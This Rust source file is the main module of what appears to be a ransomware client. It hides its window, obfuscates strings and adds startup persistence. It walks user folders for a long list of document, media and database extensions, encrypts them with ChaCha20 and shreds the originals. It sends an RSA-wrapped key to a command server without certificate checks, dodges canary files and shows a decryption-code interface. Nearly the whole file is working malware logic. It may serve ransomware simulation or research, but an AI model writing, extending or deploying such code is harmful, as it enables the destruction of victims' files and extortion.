#![cfg_attr(
    all(
        target_os = "windows",
        not(debug_assertions),
    ),
    windows_subsystem = "windows"
)]

use zeroize::Zeroize;
use hex::encode;
use std::{
    env, 
    path::PathBuf,
    sync::{Arc, Mutex},
    thread
};
use coconut_crab_lib::file::get_exe_path_dir;
use log::{debug, error, warn, info};

mod persist;
use persist::{start_persist, stop_persist};

mod crypto;
use crypto::{record, decrypt, encrypt, encrypt_string, generate_sym_key, encrypt_sym_key};

mod walker;
use walker::{walk, random_walk};

mod comm;
use comm::{download_asym_pub_key, get_sym_key, upload_sym_key, write_asym_pub_key_to_disk, announce_completion};

mod status;
use status::export_status_csv;

mod shredder;
use shredder::shred;

mod client;
use client::{initialize_client, get_thread_nums};

mod img;
use img::set_icon_wallpaper;

mod canary;
use canary::filter_canary;

mod ui;
use ui::{set_window_icon, callback_handler_init};

#[macro_use]
extern crate litcrypt2;
extern crate alloc;
use_litcrypt!();

slint::include_modules!();

macro_rules! vec_of_strings {
    ($($x:expr),*) => (vec![$($x.to_string()),*]);
}

fn main() {

    if cfg!(debug_assertions) {
        env_logger::Builder::new()
            .filter_level(log::LevelFilter::Debug)
            .init();
    } else {
        env_logger::Builder::new()
            .filter_level(log::LevelFilter::Off)
            .init();
    }

    /*
    
        +---------------------+
        | CONFIGURATION START |
        +---------------------+
    
    */

    // Configure the remote server port [required]
    let server_port = 3000;
    // Configure the remote server IP address or hostname [required]
    let server_fqdn = lc!("127.0.0.1");
    // Configure the filesystem paths to target [required]
    let allowlist_paths: Vec<PathBuf> = vec_of_strings!("C:\\Users\\jenki\\Downloads\\Dir1", "C:\\Users\\jenki\\Downloads\\Dir2").iter().map(PathBuf::from).collect();
    // let allowlist_paths = vec_of_strings!("Contacts", "Desktop", "Documents", "Downloads", "Favorites", "Music", "OneDrive\\Attachments", "OneDrive\\Desktop", "OneDrive\\Documents", "OneDrive\\Pictures", "OneDrive\\Music", "Pictures", "Videos");
    // Configure the filesystem paths to avoid [optional]
    let blocklist_paths: Option<Vec<PathBuf>> = None;
    // Configure the file extensions to target [optional]
    let allowlist_extensions: Option<Vec<String>> = Some(vec_of_strings!("jar", "xps", "pub", "eml", "htm", "aif", "ai", "dwg", "sqlite", "db", "accdb", "mdb", "stl", "obj","fbx", "3ds", "ply", "mpg", "mpeg", "webm", "mkv", "vsdm", "vsd", "vsdx", "mp4", "mp3", "vmdk", "ova", "ovf", "vmx", "qcow", "iso", "gif", "aac", "pl", "7z", "rar", "m4a", "wma", "avi", "wmv", "d3dbsp", "sc2save", "sie", "sum", "bkp", "flv", "js", "raw", "jpeg", "tar", "zip", "gz", "cmd", "key", "dot", "docm", "txt", "doc", "docx", "xls", "xlsx", "ppt", "pptx", "odt", "jpg", "png", "csv", "sql", "mdb", "sln", "php", "asp", "aspx", "html", "xml", "psd", "bmp", "pdf", "py", "rtf", "heic", "webp", "mov"));
    // Configure the file extensions to avoid [optional]
    let blocklist_extensions: Option<Vec<String>> = None;
    // Configure the extension used for encrypted files [required]
    let encrypted_extension = String::from("chacha20");
    // Configure whether the RSA public key should be saved to the disk [required]
    let save_public_key_to_disk = true;
    // Configure whether to set the wallpaper to the application icon [required]
    let set_wallpaper = false;
    // Configure whether the client should use HTTP or HTTPS [required]
    let https = true;
    // Configure whether the client should verify the web certificate of the server [required]
    let verify_server = false;
    // Confiure whether files should be encrypted or only logged for analysis [required]
    let analyze_mode = false;
    // Configure whether the client should add a startup entry [required]
    let persist = true;
    // Configure whether the client should avoid hidden files and directories [required]
    let avoid_hidden = false;
    // Configure whether the client should avoid files containing URLs (including native office ones) [required]
    let avoid_urls = true;
    // Configure whether the client should avoid files containing canary keywords [required]
    let avoid_keywords = true;
    // Configure whether the client should avoid broken image files [required]
    let avoid_broken_images = false;
    // Configure whether the client should analyze office and zip files for avoidance [required]
    let analyze_office_zip = false;
    // Configure whether the client should analyze pdf files for avoidance [required]
    let analyze_pdf = false;
    // Configure whether the client should encrypt files in a random order [required]
    let random_order = false;
    // Configure wait time between encrypting files in seconds [required]
    let wait_time = 0;
    // Configure jitter time applied to wait time between encrypting files in seconds [required]
    let jitter_time = 0;
    // Configure secret used to validate web requests [required]
    let preshared_secret = lc!("gEFPsWMHEjdbBccgFKAFwdYwD98mH6cn7mmVwVgS8Vq4EUNocCwh3wLHrEVA7RzS");

    /*
    
        +-------------------+
        | CONFIGURATION END |
        +-------------------+
    
    */

    if persist {
        debug!("Establishing persistence");
        start_persist();
    }

    let exe_path_dir = get_exe_path_dir();
    let mut status = initialize_client(&exe_path_dir,&server_fqdn, &server_port, &preshared_secret, &https, &verify_server);
    let num_threads = get_thread_nums();

    let mut sym_key = [0u8; 32];
    let mut nonce = [0u8; 12];
    
    if !status.encryption_complete {
        debug!("Encryption not previously completed");

        debug!("Starting key operations");
        if status.encryption_started {
            debug!("Encryption previously started");

            debug!("Starting key retrieval");
            sym_key = match get_sym_key(&server_fqdn, &server_port, &status, &String::from("0000-0000-0000-0000"), &preshared_secret, &https, &verify_server) {
                Some(sym_key_result) => {
                    sym_key_result
                },
                None => {
                    debug!("Unable to retrieve key. Marking encryption complete.");
                    status.encryption_complete = true;
                    [0u8; 32]
                }
            };

        } else {
            debug!("Encryption not previously started");
            generate_sym_key(&mut sym_key);

            let asym_pub_key = download_asym_pub_key(&server_fqdn, &server_port, &https,&verify_server);
            debug!("Got asymmetric public key: {:?}", asym_pub_key);

            if save_public_key_to_disk {
                debug!("Saving asymmetric public key to disk"); 
                write_asym_pub_key_to_disk(&asym_pub_key, &exe_path_dir.join("asym-pub-key.pem"));
            }

            status.asymmetrically_encrypted_symmetric_key = encrypt_sym_key(&asym_pub_key, &sym_key);
            debug!("Encrypted symmetric key: {}", status.asymmetrically_encrypted_symmetric_key);

            upload_sym_key(&server_fqdn, &server_port, &status, &preshared_secret, &https, &verify_server);
            debug!("Uploaded encrypted symmetric key");

            status.symmetrically_encrypted_id_nonce = encode(nonce);
            status.symmetrically_encrypted_id = encrypt_string(&status.id, &sym_key, &mut nonce);
            debug!("Added symmetrically encrypted id ({}) and nonce ({}) to status", status.symmetrically_encrypted_id, status.symmetrically_encrypted_id_nonce);
        }

        export_status_csv(&exe_path_dir, &status);
        debug!("Updated status CSV");
    }

    let sym_key_arc = Arc::new(sym_key);
    let nonce_mutex = Arc::new(Mutex::new(nonce));
    let blocklist_paths_arc = Arc::new(blocklist_paths);
    let allowlist_extensions_arc = Arc::new(allowlist_extensions);
    let blocklist_extensions_arc = Arc::new(blocklist_extensions);
    let encrypted_extension_vec_arc = Arc::new(Some(vec![encrypted_extension.clone()]));
    let encrypted_extension_arc = Arc::new(encrypted_extension);
    let avoid_hidden_arc = Arc::new(avoid_hidden);
    let avoid_urls_arc = Arc::new(avoid_urls);
    let avoid_keywords_arc = Arc::new(avoid_keywords);
    let avoid_broken_images_arc = Arc::new(avoid_broken_images);
    let analyze_office_zip_arc = Arc::new(analyze_office_zip);
    let analyze_pdf_arc = Arc::new(analyze_pdf);
    let wait_time_arc = Arc::new(wait_time);
    let jitter_time_arc = Arc::new(jitter_time);
    let exe_path_dir_arc = Arc::new(exe_path_dir);

    if !status.encryption_complete {
        debug!("Starting encryption process");

        status.encryption_started = true;
        export_status_csv(exe_path_dir_arc.as_ref(), &status);
        debug!("Updated status CSV");

        let (channel_a_sender, channel_a_receiver) = crossbeam_channel::unbounded();
        let mut thread_handles = Vec::new();

        for path_workload in allowlist_paths.chunks(allowlist_paths.len() / num_threads.walk_threads + 1).map(|chunk| chunk.to_vec()) {
            debug!("Spawning walk thread for path workload: {:?}", path_workload);
            let path_workload_arc = Arc::new(path_workload);
            if random_order {
                thread_handles.push(random_walk(channel_a_sender.clone(), path_workload_arc.clone(), blocklist_paths_arc.clone(), allowlist_extensions_arc.clone(), blocklist_extensions_arc.clone(), avoid_hidden_arc.clone()));
                debug!("Spawned walk thread sending paths for encryption in random order"); 
            } else {
                thread_handles.push(walk(channel_a_sender.clone(), path_workload_arc.clone(), blocklist_paths_arc.clone(), allowlist_extensions_arc.clone(), blocklist_extensions_arc.clone(), avoid_hidden_arc.clone()));
                debug!("Spawned walk thread sending paths for encryption in sequential order"); 
            }
        }
        drop(channel_a_sender);
        debug!("All walk threads spawned. {} total threads spawned.", thread_handles.len());


        let (channel_c_sender, channel_c_receiver) = crossbeam_channel::unbounded();

        if analyze_pdf || analyze_office_zip || avoid_broken_images {
            debug!("Canary mode enabled");

            let (channel_b_sender, channel_b_receiver) = crossbeam_channel::unbounded();

            for thread_num in 0..num_threads.canary_threads {
                thread_handles.push(filter_canary(channel_a_receiver.clone(),channel_b_sender.clone(), avoid_keywords_arc.clone(), avoid_urls_arc.clone(), avoid_broken_images_arc.clone(), analyze_office_zip_arc.clone(), analyze_pdf_arc.clone()));
                debug!("Spawned canary filter thread {}", thread_num);
            }
            drop(channel_a_receiver);
            drop(channel_b_sender);
            debug!("All canary threads spawned. {} total threads spawned.", thread_handles.len());

            if analyze_mode {
                debug!("Analyze mode enabled");
                thread_handles.push(record(channel_b_receiver.clone(), exe_path_dir_arc.clone()));
                debug!("Spawned analysis thread");
                drop(channel_b_receiver);
                debug!("All analysis threads spawned. {} total threads spawned.", thread_handles.len());
                drop(channel_c_sender);
                drop(channel_c_receiver);
            } else {  
                for thread_num in 0..num_threads.encrypt_threads_canary {
                    thread_handles.push(encrypt(channel_b_receiver.clone(),channel_c_sender.clone(), sym_key_arc.clone(), nonce_mutex.clone(), encrypted_extension_arc.clone(), wait_time_arc.clone(), jitter_time_arc.clone()));
                    debug!("Spawned encryption thread {}", thread_num);
                }
                debug!("All encryption threads spawned. {} total threads spawned.", thread_handles.len());
                drop(channel_b_receiver);
                drop(channel_c_sender);

                for thread_num in 0..num_threads.shred_threads {
                    thread_handles.push(shred(channel_c_receiver.clone()));
                    debug!("Spawned shred thread {}", thread_num);
                }
                drop(channel_c_receiver);
                debug!("All shred threads spawned. {} total threads spawned.", thread_handles.len());
            }
        } else if analyze_mode {
            debug!("Analyze mode enabled");
            thread_handles.push(record(channel_a_receiver.clone(), exe_path_dir_arc.clone()));
            debug!("Spawned analysis thread");
            debug!("All analysis threads spawned. {} total threads spawned.", thread_handles.len());
            drop(channel_a_receiver);
            drop(channel_c_sender);
            drop(channel_c_receiver);
        } else {    
            for thread_num in 0..num_threads.encrypt_threads {
                thread_handles.push(encrypt(channel_a_receiver.clone(),channel_c_sender.clone(), sym_key_arc.clone(), nonce_mutex.clone(), encrypted_extension_arc.clone(), wait_time_arc.clone(), jitter_time_arc.clone()));
                debug!("Spawned encryption thread {}", thread_num);
            }
            debug!("All encryption threads spawned. {} total threads spawned.", thread_handles.len());
            drop(channel_a_receiver);
            drop(channel_c_sender);

            for thread_num in 0..num_threads.shred_threads {
                thread_handles.push(shred(channel_c_receiver.clone()));
                debug!("Spawned shred thread {}", thread_num);
            }
            drop(channel_c_receiver);
            debug!("All shred threads spawned. {} total threads spawned.", thread_handles.len());
        }

        for handle in thread_handles {
            debug!("Joining thread: {:?}", handle);
            handle.join().expect("Thread panicked");
        }

        status.encryption_complete = true;
        debug!("Encryption complete");
        export_status_csv(exe_path_dir_arc.as_ref(), &status);
        debug!("Updated status CSV");

        announce_completion(&server_fqdn, &server_port, &status, &preshared_secret, &https, &verify_server);
        debug!("Announced completion");
    }

    sym_key.zeroize();
    debug!("Cleared symmetric key from memory");

    let decryption_operation = move |sym_key: [u8; 32]| {
        let (s3, r3) = crossbeam_channel::unbounded();
        let mut thread_handles = Vec::new();

        for path_workload in allowlist_paths.chunks(allowlist_paths.len() / num_threads.walk_threads + 1).map(|chunk| chunk.to_vec()) {
            debug!("Spawning walk thread for path workload: {:?}", path_workload);
            thread_handles.push(walk(s3.clone(), Arc::new(path_workload).clone(), blocklist_paths_arc.clone(), encrypted_extension_vec_arc.clone(), blocklist_extensions_arc.clone(), avoid_hidden_arc.clone()));
            debug!("Spawned walk thread sending paths for decryption in sequential order"); 
        }
        drop(s3);
        debug!("All walk threads spawned. {} total threads spawned.", thread_handles.len());
          
        let sym_key_arc = Arc::new(sym_key);
        for thread_num in 0..(num_threads.decrypt_threads) {
            thread_handles.push(decrypt(r3.clone(), sym_key_arc.clone()));
            debug!("Spawned decryption thread {}", thread_num);
        }
        drop(r3);
        debug!("All decryption threads spawned. {} total threads spawned.", thread_handles.len());

        for handle in thread_handles {
            debug!("Joining thread: {:?}", handle);
            handle.join().expect("Thread panicked");
        }
    };

    if set_wallpaper {
        set_icon_wallpaper();
    }

    let ui = Main::new().expect("Failed to create Slint UI");
    set_window_icon(&ui);
    callback_handler_init(&ui);

    let ui_handle = ui.as_weak();
    let (s_decrypt, r_decrypt) = crossbeam_channel::bounded(1);
    let decryption_handler = move || {
        debug!("Initializing decryption handler thread");
        loop {

            let code: Arc<String> = match r_decrypt.recv() {
                Ok(sym_key_result) => {
                    debug!("Received code over channel: {:?}", sym_key_result);
                    sym_key_result
                },
                Err(file_path_result) => {
                    warn!("Error receiving code over channel: {}", file_path_result);
                    return
                },
            };

            debug!("Requesting symmetric key using user provided code");
            let sym_key = match get_sym_key(&server_fqdn, &server_port, &status, &code, &preshared_secret, &https, &verify_server) {
                Some(sym_key_result) => {
                    sym_key_result
                },
                None => {
                    if ui_handle.upgrade_in_event_loop(move |handle| handle.set_status_text("Code failed verification".into())).is_err() { error!("Failed to upgrade UI handle") }
                    if ui_handle.upgrade_in_event_loop(move |handle| handle.set_status_progress(false)).is_err() { error!("Failed to upgrade UI handle") }
                    return
                }
            };

            info!("Starting decryption");
            if ui_handle.upgrade_in_event_loop(move |handle| handle.set_status_text("Code successfully verified. Decrypting...".into())).is_err() { error!("Failed to upgrade UI handle") }

            decryption_operation(sym_key);

            info!("Decryption complete");
            if ui_handle.upgrade_in_event_loop(move |handle| handle.set_status_text("Decryption complete".into())).is_err() { error!("Failed to upgrade UI handle") }
            if ui_handle.upgrade_in_event_loop(move |handle| handle.set_status_progress(false)).is_err() { error!("Failed to upgrade UI handle") }

    
            if persist {
                debug!("Ending persistence");
                stop_persist();
            }

        }
    };

    let ui_handle = ui.as_weak();
    ui.on_try_decrypt(move || {
        let ui = ui_handle.unwrap();

        let code = ui.get_code().to_string();
        info!("Verifying code: {}", code);

        ui.set_status_text("Verifying code...".into());
        ui.set_status_progress(true); 

        thread::spawn(decryption_handler.clone());
        
        s_decrypt.send(Arc::new(code)).expect("Failed to send code to decryption handler thread");

    });


    ui.run().expect("Failed to run Slint UI");

}
